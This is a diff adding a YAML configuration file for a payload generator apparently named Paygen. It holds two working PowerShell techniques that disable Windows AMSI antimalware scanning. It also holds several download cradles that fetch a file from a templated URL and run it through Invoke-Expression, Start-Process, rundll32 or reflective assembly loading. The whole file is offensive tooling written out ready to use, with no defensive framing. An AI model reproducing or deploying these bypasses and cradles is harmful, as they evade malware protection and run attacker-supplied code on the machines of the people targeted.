@@ -1,0 +1,97 @@
+# PowerShell Features: AMSI Bypasses and Download Cradles
+# Used by Paygen's web interface and payload generation
+
+# ===== AMSI Bypasses =====
+- name: AmsiContext
+  type: amsi
+  no-obf: false
+  code: |
+    $a=[Ref].Assembly.GetTypes();
+    Foreach($b in $a) {
+        if ($b.Name -like "*iUtils") {
+            $c=$b
+        }
+    };
+    $d=$c.GetFields('NonPublic,Static');
+    Foreach($e in $d) {
+        if ($e.Name -like "*Context") {
+            $f=$e
+        }
+    };
+    $g=$f.GetValue($null);
+    [IntPtr]$ptr=$g;
+    [Int32[]]$buf = @(0);
+    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+
+- name: AmsiInitialize
+  type: amsi
+  no-obf: false
+  code: |
+    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+# ===== PS1 Cradles =====
+- name: IWR-IEX (Standard)
+  type: cradle-ps1
+  no-obf: false
+  code: |
+    IWR -Uri "{url}/{output_file}" -UseBasicParsing | IEX
+
+- name: WebClient-IEX
+  type: cradle-ps1
+  no-obf: false
+  code: |
+    (New-Object System.Net.WebClient).DownloadString("{url}/{output_file}") | IEX
+
+- name: DownloadData-IEX
+  type: cradle-ps1
+  no-obf: false
+  code: |
+    [Text.Encoding]::UTF8.GetString((New-Object System.Net.WebClient).DownloadData("{url}/{output_file}")) | IEX
+
+# ===== EXE Cradles =====
+- name: DownloadFile (EXE)
+  type: cradle-exe
+  no-obf: false
+  code: |
+    (New-Object System.Net.WebClient).DownloadFile("{url}/{output_file}", "$env:TEMP\{output_file}");
+    Start-Process "$env:TEMP\{output_file}"
+
+- name: BitsTransfer (EXE)
+  type: cradle-exe
+  no-obf: false
+  code: |
+    Import-Module BitsTransfer;
+    Start-BitsTransfer -Source "{url}/{output_file}" -Destination "$env:TEMP\{output_file}";
+    Start-Process "$env:TEMP\{output_file}"
+
+- name: Assembly-Load-Invoke (EXE)
+  type: cradle-exe
+  no-obf: false
+  code: |
+    $data = (New-Object System.Net.WebClient).DownloadData('{url}/{output_file}');
+    $assem = [System.Reflection.Assembly]::Load($data);
+    [{namespace}.{class}]::{entry_point}("{args}".Split())
+
+# ===== DLL Cradles =====
+- name: DownloadFile (DLL)
+  type: cradle-dll
+  no-obf: false
+  code: |
+    (New-Object System.Net.WebClient).DownloadFile("{url}/{output_file}", "$env:TEMP\{output_file}");
+    rundll32.exe "$env:TEMP\{output_file}",{entry_point}
+
+- name: BitsTransfer (DLL)
+  type: cradle-dll
+  no-obf: false
+  code: |
+    Import-Module BitsTransfer;
+    Start-BitsTransfer -Source "{url}/{output_file}" -Destination "$env:TEMP\{output_file}";
+    rundll32.exe "$env:TEMP\{output_file}",{entry_point}
+
+- name: Assembly-Load-Invoke (DLL)
+  type: cradle-dll
+  no-obf: false
+  code: |
+    $data = (New-Object System.Net.WebClient).DownloadData('{url}/{output_file}');
+    $assem = [System.Reflection.Assembly]::Load($data);
+    [{namespace}.{class}]::{entry_point}("{args}".Split())
